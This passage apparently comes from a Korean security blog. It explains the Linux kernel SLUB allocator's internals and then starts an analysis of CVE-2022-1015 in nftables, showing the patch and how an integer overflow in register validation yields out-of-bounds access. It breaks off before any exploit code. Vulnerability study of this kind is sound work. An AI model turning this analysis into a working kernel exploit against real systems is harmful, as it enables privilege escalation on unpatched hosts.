패치로 동일한 캐시를 이용한적이 있었지만 다시 독립된 캐시로 변경되었다. 위와 같이 이용된다.\nFreelist randomization #ifdef CONFIG_SLAB_FREELIST_RANDOM /* Pre-initialize the random sequence cache */ static int init_cache_random_seq(struct kmem_cache *s) { unsigned int count = oo_objects(s-\u0026gt;oo); int err; /* Bailout if already initialised */ if (s-\u0026gt;random_seq) return 0; err = cache_random_seq_create(s, count, GFP_KERNEL); if (err) { pr_err(\u0026#34;SLUB: Unable to initialize free list for %s\\n\u0026#34;, s-\u0026gt;name); return err; } /* Transform to an offset on the set of pages */ if (s-\u0026gt;random_seq) { unsigned int i; for (i = 0; i \u0026lt; count; i++) s-\u0026gt;random_seq[i] *= s-\u0026gt;size; } return 0; } /* Get the next entry on the pre-computed freelist randomized */ static void *next_freelist_entry(struct kmem_cache *s, struct slab *slab, unsigned long *pos, void *start, unsigned long page_limit, unsigned long freelist_count) { unsigned int idx; /* * If the target page allocation failed, the number of objects on the * page might be smaller than the usual size defined by the cache. */ do { idx = s-\u0026gt;random_seq[*pos]; *pos += 1; if (*pos \u0026gt;= freelist_count) *pos = 0; } while (unlikely(idx \u0026gt;= page_limit)); return (char *)start + idx; } freelist가 랜덤화되면서 객체의 순차적 할당이나 재할당을 어렵게 만든다.\nkmem_cache_cpu #ifndef CONFIG_SLUB_TINY /* * When changing the layout, make sure freelist and tid are still compatible * with this_cpu_cmpxchg_double() alignment requirements. */ struct kmem_cache_cpu { union { struct { void **freelist;\t/* Pointer to next available object */ unsigned long tid;\t/* Globally unique transaction id */ }; freelist_aba_t freelist_tid; }; struct slab *slab;\t/* The slab from which we are allocating */ #ifdef CONFIG_SLUB_CPU_PARTIAL struct slab *partial;\t/* Partially allocated frozen slabs */ #endif local_lock_t lock;\t/* Protects the fields above */ #ifdef CONFIG_SLUB_STATS unsigned stat[NR_SLUB_STAT_ITEMS]; #endif }; #endif /* CONFIG_SLUB_TINY */ freelist는 cpu별 free objects의 리스트이다. slab은 cpu에서 할당에 사용중인 슬랩이다. 원래 이름은 struct page였는데, kernel 5.17부터 struct slab으로 명칭이 변경되었다. partial은 해당 page내 일부 object가 cpu에서 사용중인 경우 partial list로 관리된다. 이런식으로 현재 할당에 이용할 slab엔 하나의 slab page가 링크되고, partial slabs에는 대기중인 slab page들이 링크되어있다. cpu slab의 page의 freelist와 percpu struct의 freelist는 같다. 하지만 다른 NUMA node에서 remote free 할때 실제 slab struct의 freelist와 약간 달라질 수 있다.\nstruct slab /* Reuses the bits in struct page */ struct slab { unsigned long __page_flags; #if defined(CONFIG_SLAB) struct kmem_cache *slab_cache; union { struct { struct list_head slab_list; void *freelist;\t/* array of free object indexes */ void *s_mem;\t/* first object */ }; struct rcu_head rcu_head; }; unsigned int active; #elif defined(CONFIG_SLUB) struct kmem_cache *slab_cache; union { struct { union { struct list_head slab_list; #ifdef CONFIG_SLUB_CPU_PARTIAL struct { struct slab *next; int slabs;\t/* Nr of slabs left */ }; #endif }; /* Double-word boundary */ union { struct { void *freelist;\t/* first free object */ union { unsigned long counters; struct { unsigned inuse:16; unsigned objects:15; unsigned frozen:1; }; }; }; #ifdef system_has_freelist_aba freelist_aba_t freelist_counter; #endif }; }; struct rcu_head rcu_head; }; unsigned int __unused; #else #error \u0026#34;Unexpected slab allocator configured\u0026#34; #endif atomic_t __page_refcount; #ifdef CONFIG_MEMCG unsigned long memcg_data; #endif }; struct page에서 이름이 바뀌었다. percpu에서도 있지만, slab page 구조체에서도 freelist가 있다. 이 둘을 이용해서 할당 \u0026amp; 해제를 좀 더 효율적으로 진행한다. 이에 대해선 Allocation 관련 설명을 하면서 후술한다.\nkmem_cache_node struct kmem_cache_node { #ifdef CONFIG_SLAB raw_spinlock_t list_lock; struct list_head slabs_partial;\t/* partial list first, better asm code */ struct list_head slabs_full; struct list_head slabs_free; unsigned long total_slabs;\t/* length of all slab lists */ unsigned long free_slabs;\t/* length of free slab list only */ unsigned long free_objects; unsigned int free_limit; unsigned int colour_next;\t/* Per-node cache coloring */ struct array_cache *shared;\t/* shared per node */ struct alien_cache **alien;\t/* on other nodes */ unsigned long next_reap;\t/* updated without locking */ int free_touched;\t/* updated without locking */ #endif #ifdef CONFIG_SLUB spinlock_t list_lock; unsigned long nr_partial; struct list_head partial; #ifdef CONFIG_SLUB_DEBUG atomic_long_t nr_slabs; atomic_long_t total_objects; struct list_head full; #endif #endif }; spinlock_t list_lock은 node에 동시접근 방지하기 위한 lock이다. 그리고 struct list_head partial은 node별로 관리되는 partial page list이다.\nAllocation 정리하자면, kmem_cache_cpu는 CPU 별로 각자의 슬랩 페이지를 주고 관리하게 한다. 그리고 kmem_cache_cpu struct의 freelist는 할당에 이용되는 slab에 대한 freelist이다. lockless하게 할당과 해제를 진행하게 된다.\n근데 struct slab에서도 freelist가 존재했다. cpu -\u0026gt; freelist와 cpu -\u0026gt; slab -\u0026gt; freelist는 차이가 있다. 전자는 현재 CPU가 관리하며 free시 추가된다. 후자는 현재 CPU가 관리하는 slab page에 속한 object를 remote CPU가 free시에 리스트에 추가된다. 이러한 remote cpu, 즉 전담 cpu가 아닌 경우엔 항상 free만 가능하다.\nfrozen page는 list management에서 제외되는 페이지를 뜻한다. freeze한 cpu만이 list operation을 수행하며, object를 freelist에서 뽑아오는 연산등을 할 수 있다. frozen page여도 다른 cpu가 object를 freelist를 넣을 수는 있다.\n이러한 frozen page에서 cpu -\u0026gt; freelist가 가리키는 free object들과 in-use object들은 cpu -\u0026gt; page.inuse의 값과 같으며 remote cpu가 free 할때만 감소한다. 즉 현재 CPU가 컨트롤하고 있는 object 개수만 inuse로 취급한다는 뜻이다. 앞서 remote cpu는 전담 cpu의 slab object에 대한 free만 가능하다는 사실과 일맥상통한다.\nFast-Path cpu -\u0026gt; freelist에서 object 할당한다. Slow-Path 1, 2 Slow-Path 1 cpu -\u0026gt; slab에 freelist를 cpu -\u0026gt; freelist로 옮긴다. cpu -\u0026gt; freelist에서 object를 할당한다 Slow-Path 2 cpu -\u0026gt; partial를 cpu -\u0026gt; page로 옮긴다. cpu -\u0026gt; page -\u0026gt; freelist를 cpu -\u0026gt; freelist로 옮긴다. cpu -\u0026gt; freelist에서 object를 할당한다. Slow-Path 3, 4 Slow-Path 3 이번엔 slab_cache -\u0026gt; cpu가 아니라 slab_cache -\u0026gt; node 이다.\nnode -\u0026gt; partial를 freeze freeze 하는 이유는 아주 당연하지만 node의 동시 접근 때문이다. node -\u0026gt; partial를 탐색하다가 page를 cpu -\u0026gt; slab으로 옮긴다. cpu -\u0026gt; slab -\u0026gt; freelist를 cpu -\u0026gt; freelist로 옮긴다. node -\u0026gt; partial의 slab page 일부를 cpu -\u0026gt;partial로 옮긴다. moved partial_slabs \u0026gt; s-\u0026gt;cpu_partial_slabs / 2 속한 node의 partial list가 비었으면 인접한 node도 탐색한다.\nSlow-Path 4 Buddy System으로부터 신규 slab page를 할당한다. 신규 page는 모든 object가 freelist에 존재한다. new slab을 cpu -\u0026gt; slab로 옮긴다. cpu -\u0026gt; freelist로도 옮긴다. Deallocation 할당과 비슷하게 fast, slow path가 있다.\nFast-Path frozen page에 대해서 percpu의 freelist에 바로 반환한다.\nSlow-Path 오브젝트가 속한 slab page freelist에 반환한다. 여러 케이스들이 있다.\nremote cpu가 다른 cpu slab을 free해서 리턴한다. node의 partial에 리턴한다. inuse가 0이면, 관할 cpu가 더이상 효율적으로 이용하지 못한다는 의미이므로 node로 옮긴다. 근데 이때 min_partial 보다 크거나 같아지면 buddy system에 다시 리턴한다. node partial이 아니고 모든 객체가 할당된 상태이며 frozen 상태가 아니면 cpu partial에 추가한다. 마지막 부분은 아직 잘 모르겠다.\nOptimization From: Christoph Lameter \u0026lt;cl@linux.com\u0026gt; To: Tejun Heo \u0026lt;tj@kernel.org\u0026gt; Cc: akpm@linux-foundation.org Cc: Pekka Enberg \u0026lt;penberg@cs.helsinki.fi\u0026gt; Cc: linux-kernel@vger.kernel.org Cc: Eric Dumazet \u0026lt;eric.dumazet@gmail.com\u0026gt; Cc: \u0026#34;H. Peter Anvin\u0026#34; \u0026lt;hpa@zytor.com\u0026gt; Cc: Mathieu Desnoyers \u0026lt;mathieu.desnoyers@efficios.com\u0026gt; Subject: [[cpuops cmpxchg double V2 4/4] Lockless (and preemptless) fastpaths for slub](https://lore.kernel.org/lkml/20110106204526.977812009@linux.com/#r) Date: Thu, 06 Jan 2011 14:45:17 -0600\t[[thread overview]](https://lore.kernel.org/lkml/20110106204526.977812009@linux.com/#r) Message-ID: \u0026lt;20110106204526.977812009@linux.com\u0026gt; ([raw](https://lore.kernel.org/lkml/20110106204526.977812009@linux.com/raw)) In-Reply-To: 20110106204513.669098445@linux.com [[-- /blog/Linux_kernel_SLUB_Allocator #1: cpuops_double_slub_fastpath --] [-- Type: text/plain, Size: 12414 bytes --]](https://lore.kernel.org/lkml/20110106204526.977812009@linux.com/1-cpuops_double_slub_fastpath) Use the this_cpu_cmpxchg_double functionality to implement a lockless allocation algorithm on arches that support fast this_cpu_ops. Each of the per cpu pointers is paired with a transaction id that ensures that updates of the per cpu information can only occur in sequence on a certain cpu. A transaction id is a \u0026#34;long\u0026#34; integer that is comprised of an event number and the cpu number. The event number is incremented for every change to the per cpu state. The cmpxchg instruction can therefore verify for an update that nothing else has interfered and that we are updating the percpu\u0026#39; structure for the processor where we initially picked up the information and that we are also currently on that processor. So there is no need even to disable preemption. Test results show that the fastpath cycle count is reduced by up to ~ 40% (alloc/free test goes from ~140 cycles down to ~80). The slowpath for kfree adds a few cycles. Sadly this does nothing for the slowpath which is where the main issues with performance in slub are but the best case performance rises significantly. (For that see the more complex slub patches that require cmpxchg_double) Kmalloc: alloc/free test Before: 10000 times kmalloc(8)/kfree -\u0026gt; 134 cycles 10000 times kmalloc(16)/kfree -\u0026gt; 152 cycles 10000 times kmalloc(32)/kfree -\u0026gt; 144 cycles 10000 times kmalloc(64)/kfree -\u0026gt; 142 cycles 10000 times kmalloc(128)/kfree -\u0026gt; 142 cycles 10000 times kmalloc(256)/kfree -\u0026gt; 132 cycles 10000 times kmalloc(512)/kfree -\u0026gt; 132 cycles 10000 times kmalloc(1024)/kfree -\u0026gt; 135 cycles 10000 times kmalloc(2048)/kfree -\u0026gt; 135 cycles 10000 times kmalloc(4096)/kfree -\u0026gt; 135 cycles 10000 times kmalloc(8192)/kfree -\u0026gt; 144 cycles 10000 times kmalloc(16384)/kfree -\u0026gt; 754 cycles After: 10000 times kmalloc(8)/kfree -\u0026gt; 78 cycles 10000 times kmalloc(16)/kfree -\u0026gt; 78 cycles 10000 times kmalloc(32)/kfree -\u0026gt; 82 cycles 10000 times kmalloc(64)/kfree -\u0026gt; 88 cycles 10000 times kmalloc(128)/kfree -\u0026gt; 79 cycles 10000 times kmalloc(256)/kfree -\u0026gt; 79 cycles 10000 times kmalloc(512)/kfree -\u0026gt; 85 cycles 10000 times kmalloc(1024)/kfree -\u0026gt; 82 cycles 10000 times kmalloc(2048)/kfree -\u0026gt; 82 cycles 10000 times kmalloc(4096)/kfree -\u0026gt; 85 cycles 10000 times kmalloc(8192)/kfree -\u0026gt; 82 cycles 10000 times kmalloc(16384)/kfree -\u0026gt; 706 cycles Kmalloc: Repeatedly allocate then free test Before: 10000 times kmalloc(8) -\u0026gt; 211 cycles kfree -\u0026gt; 113 cycles 10000 times kmalloc(16) -\u0026gt; 174 cycles kfree -\u0026gt; 115 cycles 10000 times kmalloc(32) -\u0026gt; 235 cycles kfree -\u0026gt; 129 cycles 10000 times kmalloc(64) -\u0026gt; 222 cycles kfree -\u0026gt; 120 cycles 10000 times kmalloc(128) -\u0026gt; 343 cycles kfree -\u0026gt; 139 cycles 10000 times kmalloc(256) -\u0026gt; 827 cycles kfree -\u0026gt; 147 cycles 10000 times kmalloc(512) -\u0026gt; 1048 cycles kfree -\u0026gt; 272 cycles 10000 times kmalloc(1024) -\u0026gt; 2043 cycles kfree -\u0026gt; 528 cycles 10000 times kmalloc(2048) -\u0026gt; 4002 cycles kfree -\u0026gt; 571 cycles 10000 times kmalloc(4096) -\u0026gt; 7740 cycles kfree -\u0026gt; 628 cycles 10000 times kmalloc(8192) -\u0026gt; 8062 cycles kfree -\u0026gt; 850 cycles 10000 times kmalloc(16384) -\u0026gt; 8895 cycles kfree -\u0026gt; 1249 cycles After: 10000 times kmalloc(8) -\u0026gt; 190 cycles kfree -\u0026gt; 129 cycles 10000 times kmalloc(16) -\u0026gt; 76 cycles kfree -\u0026gt; 123 cycles 10000 times kmalloc(32) -\u0026gt; 126 cycles kfree -\u0026gt; 124 cycles 10000 times kmalloc(64) -\u0026gt; 181 cycles kfree -\u0026gt; 128 cycles 10000 times kmalloc(128) -\u0026gt; 310 cycles kfree -\u0026gt; 140 cycles 10000 times kmalloc(256) -\u0026gt; 809 cycles kfree -\u0026gt; 165 cycles 10000 times kmalloc(512) -\u0026gt; 1005 cycles kfree -\u0026gt; 269 cycles 10000 times kmalloc(1024) -\u0026gt; 1999 cycles kfree -\u0026gt; 527 cycles 10000 times kmalloc(2048) -\u0026gt; 3967 cycles kfree -\u0026gt; 570 cycles 10000 times kmalloc(4096) -\u0026gt; 7658 cycles kfree -\u0026gt; 637 cycles 10000 times kmalloc(8192) -\u0026gt; 8111 cycles kfree -\u0026gt; 859 cycles 10000 times kmalloc(16384) -\u0026gt; 8791 cycles kfree -\u0026gt; 1173 cycles Signed-off-by: Christoph Lameter \u0026lt;cl@linux.com\u0026gt; --- include/linux/slub_def.h | 5 - mm/slub.c | 205 ++++++++++++++++++++++++++++++++++++++++++++++- 2 files changed, 207 insertions(+), 3 deletions(-) 찾아보니 위와 같은 패치를 찾을 수 있었다. percpu의 tid는 percpu update마다 증가되며 순차적인 업데이트를 보장한다. 중간에 interrupt로 인해 실행흐름이 넘어갈때 똑같이 percpu에 접근해서 할당을 하거나 하면 순차적인 업데이트를 보장하지 못한다.\n왜냐하면 allocation request가 왔을때 freelist를 읽었는데, 이때 실행흐름이 새로운 allocation request로 넘어가면 분명 다른 두가지 요청인데 같은 메모리를 리턴하게 될 수도 있기 때문이다. 이를 방지하기 위해서 원래는 interrupt disable 했었다.\n근데 만약 cmpxchg double을 지원하는 아키텍쳐에서 이를 이용하면 단순히 tid에 대한 검증과 리턴을 하나의 명령내에서 처리가 가능하다. 당연히 interrupt를 쓰지 않아도 되며, tid를 모든 allocation request가 순차적이라는 것을 보장할 수 있게 되었다.\n또한 free시에도 lockless하게 구현할 수 있게 되었다. 원래 freelist를 가져가서 lock 걸고 list에서 뽑고 counter를 줄였는데, cmpxchg double로 그때 그때 counter 비교해서 다른 cpu가 counter 건들면 retry하면 된다.\nDebugging 직접 디버깅해보면, 슬랩 캐시도 보이고 random도 보인다. 5.19 기준으로 random 값이 있었고 청크의 next가 mangling 되어있었다. 나머지는 앞에서 살펴봤던 구조와 같았다.\npercpu를 확인해보면 이런식으로 freelist가 존재한다. 정상적으로 첫번째 slab object가 리턴되는것을 확인할 수 있다.\n","permalink":"https://msh1307.kr/blog/linux-kernel-slub-allocator/","summary":"SLUB Allocator Userland에선 ptmalloc2가 있는 반면, Kernelland에선 SLUB이 있다. 초기엔 SLAB Allocator를 사용했지만, 현재 대부분의 배포판은 SLUB을 이용한다. 기존 SLAB allocator의 단점을 개선한 버전이다. kmem_cache_create로 slab cache를 생성하고 kmem_cache_alloc으로 지정된 slab cache에서 object를 할당한다. kmem_cache_free로 free하고 kmem_cache_destroy로 slab cache를 제거한다. kmalloc, kzalloc 같은 함수는 kmalloc-N 캐시에서 적합한 size인 object를 할당한다.\nTerms slab SLAB allocator랑 다른말이다. slab cache (= kmem_cache)를 확보하고 관리하는 주체다.\nslab cache msh@raspberrypi:~ $ sudo cat /proc/slabinfo slabinfo - version: 2.","title":"Linux kernel SLUB allocator"},{"content":"Backgrounds Capabilites 요즘 리눅스들은 단순 root VS normal user가 아니다. capabilities로 나뉘어져 권한이 부여된다. 즉 root를 통째로 주지 않고 미세한 capability를 부여해서 리스크를 최소화 시킨다.\nNamespace namespace는 일종의 보안적인 요소들같은 것들을 모두 격리시키는 공간? 이다. 여기엔 UID GID cred keys capabilites 등이 모두 포함된다.\nnested namespace 유저의 namespace는 중첩될 수 있다. 그 뜻은 initial root를 제외한 네임스페이스가 부모 namespace를 갖는다는 뜻이다. 0개 혹은 더 많은 child namespace를 가질 수 있다. parent user namespace는 unshare나 clone에 CLONE_NEWUSER flag를 집어서 호출하는 namespace이다. 커널은 32개의 nested level로 제한을 둔다. 모든 프로세스는 정확히 하나의 유저 네임스페이스의 멤버이다. fork나 clone에 CLONE_NEWUSER 플래그 없이 만들어졌으면 부모 프로세스와 똑같은 네임스페이스를 가진다. 도커 컨테이너 구현할때도 써진다.\n하이퍼바이저랑 약간의 차이가 있는데, 하이퍼바이저는 하드웨어를 가상화한다. 그런데 네임스페이스는 하드웨어를 분리하지 않고 동일한 OS나 커널에서 돌아간다.\nNamespace가 중요한 이유는, attack vector가 넓어지기 때문에.\nNetfilter 서브시스템 넷필터는 네트워크 패킷처리나 라우팅 등 여러가지 기능을 처리해주는 커널의 서브시스템중 하나이다. 넷필터 프로젝트라고 커널의 그쪽 부분을 담당하는 프로젝트이다. 필터링 라우팅 NAT 패킷 수정 등을 처리한다.\nNetlink socket 넷링크 소켓은 커널과 사용자 공간사이 통신할 수 있는 IPC 메커니즘 중 하나이다. 하나 이상의 Netlink message를 붙여서 request response 단위로 묶어서 전송을 구현한다. Header와 payload는 align 맞추기 위해서 padding도 있을 수 있다.\n+----------------------+----------------------+----------------------+----------------------+ ~ ~ ~ ~ ~ +----------------------+ | Netlink messaeg #1 | Netlink messaeg #2 | Netlink messaeg #3 | Netlink messaeg #4 | ... | Netlink messaeg #n | | (Header+Payload+Pad) | (Header+Payload+Pad) | (Header+Payload+Pad) | (Header+Payload+Pad) | | (Header+Payload+Pad) | +----------------------+----------------------+----------------------+----------------------+ ~ ~ ~ ~ ~ +----------------------+ \u0026lt;--------------------------------------------------- Request OR Response packet -----------------------------------------------\u0026gt; message format은 이렇게 생겼다.\n\u0026lt;------- NLA_HDRLEN ------\u0026gt; \u0026lt;-- NLA_ALIGN(payload)--\u0026gt; +---------------------+- - -+- - - - - - - - - -+- - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ | Header | Pad | Payload | Pad | ... (Next attribute) ... | (struct nlattr) | ing | | ing | +---------------------+- - -+- - - - - - - - - -+- - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ↑ nlattr \u0026lt;-------------- nlattr-\u0026gt;nla_len --------------\u0026gt; nla_type (16 bits) +---+---+-------------------------------+ | N | O | Attribute Type | +---+---+-------------------------------+ N := Carries nested attributes O := Payload stored in network byte order Note: The N and O flag are mutually exclusive. \u0026lt;----- NLMSG_HDRLEN ------\u0026gt; \u0026lt;-------- Payload-Len --------\u0026gt; +---------------------+- - -+- - - - - - - - - - - - - - - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ | Header | Pad | Payload | ... (Next netlink message) ... | (struct nlmsghdr) | ing | Specific data + [attribute..] | +---------------------+- - -+- - - - - - - - - - - - - - - -+ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ↑ nlmsghdr ↑ NLMSG_DATA(\u0026amp;nlmsghdr) ↑ NLMSG_NEXT(\u0026amp;nlmsghdr) \u0026lt;------------------ nlmsghdr-\u0026gt;nlmsg_len ------------------\u0026gt; \u0026lt;------------------ NLMSG_LENGTH(Payload-Len) ------------\u0026gt; 넷링크 헤더, 속성 구조체의 모습이다.\nstruct nlmsghdr { uint32_t nlmsg_len; /* Header를 포함한 Netlink message 크기 */ uint16_t nlmsg_type; /* Message content */ uint16_t nlmsg_flags; /* Additional flags */ uint32_t nlmsg_seq; /* Sequence number */ uint32_t nlmsg_pid; /* Sending process port ID */ }; struct nlattr { uint16_t nla_len; /* Header를 포함한 attribute 크기 */ uint16_t nla_type; /* Attribute type */ }; 어떤식으로로 구현하는지에 대한 예제도 examples에서 찾을 수 있었다.\ns_socket = socket(PF_NETLINK, SOCK_RAW, NETLINK_XFRM); __u32 s_nl_groups; struct sockaddr_nl s_sockaddr_nl; s_nl_groups |= XFRMNLGRP_ACQUIRE; s_nl_groups |= XFRMNLGRP_EXPIRE; s_nl_groups |= XFRMNLGRP_SA; s_nl_groups |= XFRMNLGRP_POLICY; s_nl_groups |= XFRMNLGRP_AEVENTS; s_nl_groups |= XFRMNLGRP_REPORT; s_nl_groups |= XFRMNLGRP_MIGRATE; s_nl_groups |= XFRMNLGRP_MAPPING; s_sockaddr_nl.nl_family = AF_NETLINK; s_sockaddr_nl.nl_pad = (unsigned short)0u; s_sockaddr_nl.nl_pid = (pid_t)0; s_sockaddr_nl.nl_groups = s_nl_groups; /* Multicast groups mask */ bind(s_socket, (const struct sockaddr *)(\u0026amp;s_sockaddr_nl), (socklen_t)sizeof(s_sockaddr_nl)); sock_fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE); __u32 s_nl_groups; struct sockaddr_nl s_sockaddr_nl; s_nl_groups |= XFRMNLGRP_ACQUIRE; s_nl_groups |= XFRMNLGRP_EXPIRE; s_nl_groups |= XFRMNLGRP_SA; s_nl_groups |= XFRMNLGRP_POLICY; s_nl_groups |= XFRMNLGRP_AEVENTS; s_nl_groups |= XFRMNLGRP_REPORT; s_nl_groups |= XFRMNLGRP_MIGRATE; s_nl_groups |= XFRMNLGRP_MAPPING; s_sockaddr_nl.nl_family = AF_NETLINK; s_sockaddr_nl.nl_pad = (unsigned short)0u; s_sockaddr_nl.nl_pid = (pid_t)0; s_sockaddr_nl.nl_groups = s_nl_groups; /* Multicast groups mask */ bind(s_socket, (const struct sockaddr *)(\u0026amp;s_sockaddr_nl), (socklen_t)sizeof(s_sockaddr_nl)); socklen_t s_socklen; s_socklen = (socklen_t)sizeof(s_sockaddr_nl); s_recv_bytes = recvfrom( s_socket, s_buffer, s_buffer_size, MSG_NOSIGNAL, (struct sockaddr *)(\u0026amp;s_sockaddr_nl), (socklen_t *)(\u0026amp;s_socklen) ); size_t s_msg_size; struct nlmsghdr *s_nlmsghdr; size_t s_payload_size; void *s_payload; s_msg_size = (size_t)s_recv_bytes; for(s_nlmsghdr = (struct nlmsghdr *)s_buffer;(s_is_break == 0) \u0026amp;\u0026amp; NLMSG_OK(s_nlmsghdr, s_msg_size);s_nlmsghdr = NLMSG_NEXT(s_nlmsghdr, s_msg_size)) { /* Netlink 수신패킷 하나에 여러개의 Netlink header가 탑재될 수 있는데 이를 각 Header 단위로 분리하는 Loop */ s_payload_size = (size_t)NLMSG_PAYLOAD(s_nlmsghdr, 0); /* Header 내의 실제 Data 크기 */ s_payload = NLMSG_DATA(s_nlmsghdr); /* Header 내의 실제 Data 위치 포인터 */ switch(s_nlmsghdr-\u0026gt;nlmsg_type) { /* 각 메세지의 종류별로 다른 파싱구조를 가지고 있으므로 커널을 참조하여 해당 부분을 파싱해야 합니다. */ ..... } } 도메인은 AF_NETLINK를 쓰고 SOCK_RAW를 사용한다. netlink protocol은 netlink group과 kernel modules간의 통신을 위해 Netlink family를 선택한다. NETLINK_ROUTE : routing 업데이트 및 ipv4 routing 등등\nnftables ip tables, ip6 tables, arp tables, eb tables을 대체할 수 있다. 원래는 ip tables가 패킷 필터링 기능을 수행했지만 ip tables를 대체할 프레임워크로 nftables가 나왔다. 넷필터 서브시스템에서 nftables가 iptables 역할을 대신해서 vm 기반 룰을 작성할 수 있다. iptables VS nftables 차이는 위와 같다. nftables는 커널 내부의 경량 가상머신을 이용해서 패킷이 필터링 된다. 훅포인트는 5개이다. Prerouting은 NIC 카드에 패킷 들어왔을때, Input은 packet이 local로 들어왔을때 등 중요한 오브젝트들이 많다. 제일 중요한 테이블이 있다. chain들은 rule의 집합이고 rule은 expression의 집합이다. meta cmp payload bitwise immediate etc.. register가 16바이트짜리가 있음. 레지스터인데 메모리로 처리한다. 선형적인 메모리 레이아웃 meta expression이 있다. vm에서 map이 지원되기 때문에, key에 해당하는 데이터를 로드하고 저장가능. bitwise는 레지스터간 bit 연산을 수행한다. payload가 있는데, 데이터 복사에 사용된다. CVE-2022-1015 net/netfilter/nf_tables_api.c | 22 +++++++++++++++++----- 1 file changed, 17 insertions(+), 5 deletions(-) diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_api.c index d71a33ae39b3..1f5a0eece0d1 100644 --- a/net/netfilter/nf_tables_api.c +++ b/net/netfilter/nf_tables_api.c @@ -9275,17 +9275,23 @@ int nft_parse_u32_check(const struct nlattr *attr, int max, u32 *dest) } EXPORT_SYMBOL_GPL(nft_parse_u32_check); -static unsigned int nft_parse_register(const struct nlattr *attr) +static unsigned int nft_parse_register(const struct nlattr *attr, u32 *preg) { unsigned int reg; reg = ntohl(nla_get_be32(attr)); switch (reg) { case NFT_REG_VERDICT...NFT_REG_4: -\treturn reg * NFT_REG_SIZE / NFT_REG32_SIZE; +\t*preg = reg * NFT_REG_SIZE / NFT_REG32_SIZE; +\tbreak; +\tcase NFT_REG32_00...NFT_REG32_15: +\t*preg = reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00; +\tbreak; default: -\treturn reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00; +\treturn -ERANGE; } + +\treturn 0; } /** @@ -9327,7 +9333,10 @@ int nft_parse_register_load(const struct nlattr *attr, u8 *sreg, u32 len) u32 reg; int err; -\treg = nft_parse_register(attr); +\terr = nft_parse_register(attr, \u0026amp;reg); +\tif (err \u0026lt; 0) +\treturn err; + err = nft_validate_register_load(reg, len); if (err \u0026lt; 0) return err; @@ -9382,7 +9391,10 @@ int nft_parse_register_store(const struct nft_ctx *ctx, int err; u32 reg; -\treg = nft_parse_register(attr); +\terr = nft_parse_register(attr, \u0026amp;reg); +\tif (err \u0026lt; 0) +\treturn err; + err = nft_validate_register_store(ctx, reg, data, type, len); if (err \u0026lt; 0) return err; -- NFT_REG_VERDICT … NFT_REG_4가 아니면, REG32라고 단정지어버린다.\nint nft_parse_register_load(const struct nlattr *attr, u8 *sreg, u32 len) { u32 reg; int err; reg = nft_parse_register(attr); err = nft_validate_register_load(reg, len); if (err \u0026lt; 0) return err; *sreg = reg; return 0; } EXPORT_SYMBOL_GPL(nft_parse_register_load); ... EXPORT_SYMBOL_GPL(nft_parse_u32_check); static unsigned int nft_parse_register(const struct nlattr *attr) { unsigned int reg; reg = ntohl(nla_get_be32(attr)); switch (reg) { case NFT_REG_VERDICT...NFT_REG_4: return reg * NFT_REG_SIZE / NFT_REG32_SIZE; default: return reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00; } } ... EXPORT_SYMBOL_GPL(nft_dump_register); static int nft_validate_register_load(enum nft_registers reg, unsigned int len) { if (reg \u0026lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE) return -EINVAL; if (len == 0) return -EINVAL; if (reg * NFT_REG32_SIZE + len \u0026gt; sizeof_field(struct nft_regs, data)) return -ERANGE; return 0; } validation check도 우회할 수 있다. reg \u0026lt; 4 → EINVAL.\n4랑 곱하면 어차피 integer overflow로 인해 bypass 가능하다. 결국 OoB 마찬가지로 register store할때도 똑같이 발생한다.\nnft_payload if (tb[NFTA_PAYLOAD_SREG] != NULL) { if (tb[NFTA_PAYLOAD_DREG] != NULL) return ERR_PTR(-EINVAL); return \u0026amp;nft_payload_set_ops; } offset = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_OFFSET])); len = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_LEN])); if (len \u0026lt;= 4 \u0026amp;\u0026amp; is_power_of_2(len) \u0026amp;\u0026amp; IS_ALIGNED(offset, len) \u0026amp;\u0026amp; base != NFT_PAYLOAD_LL_HEADER) return \u0026amp;nft_payload_fast_ops; else return \u0026amp;nft_payload_ops; SREG == NOT NULL / DREG == NULL -\u0026gt; payload_set_ops\nSREG == NULL / DREG == NOT NULL -\u0026gt; payload_ops or fast\n총 두개로 갈려서 세팅 가능.\nstatic const struct nft_expr_ops nft_payload_set_ops = { .type\t= \u0026amp;nft_payload_type, .size\t= NFT_EXPR_SIZE(sizeof(struct nft_payload_set)), .eval\t= nft_payload_set_eval, .init\t= nft_payload_set_init, .dump\t= nft_payload_set_dump, }; static const struct nft_expr_ops nft_payload_ops = { .type\t= \u0026amp;nft_payload_type, .size\t= NFT_EXPR_SIZE(sizeof(struct nft_payload)), .eval\t= nft_payload_eval, .init\t= nft_payload_init, .dump\t= nft_payload_dump, .offload\t= nft_payload_offload, }; const struct nft_expr_ops nft_payload_fast_ops = { .type\t= \u0026amp;nft_payload_type, .size\t= NFT_EXPR_SIZE(sizeof(struct nft_payload)), .eval\t= nft_payload_eval, .init\t= nft_payload_init, .dump\t= nft_payload_dump, .offload\t= nft_payload_offload, }; 실질적으로 다른 역할을 하는건 payload_ops set_ops 차이다. init → eval 순서\nnft_payload_ops static int nft_payload_init(const structnft_ctx *ctx, const structnft_expr *expr, const structnlattr * consttb[]) { structnft_payload *priv =nft_expr_priv(expr); priv-\u0026gt;base =ntohl(nla_get_be32(tb[NFTA_PAYLOAD_BASE])); priv-\u0026gt;offset =ntohl(nla_get_be32(tb[NFTA_PAYLOAD_OFFSET])); priv-\u0026gt;len =ntohl(nla_get_be32(tb[NFTA_PAYLOAD_LEN])); return nft_parse_register_store(ctx,tb[NFTA_PAYLOAD_DREG], \u0026amp;priv-\u0026gt;dreg, 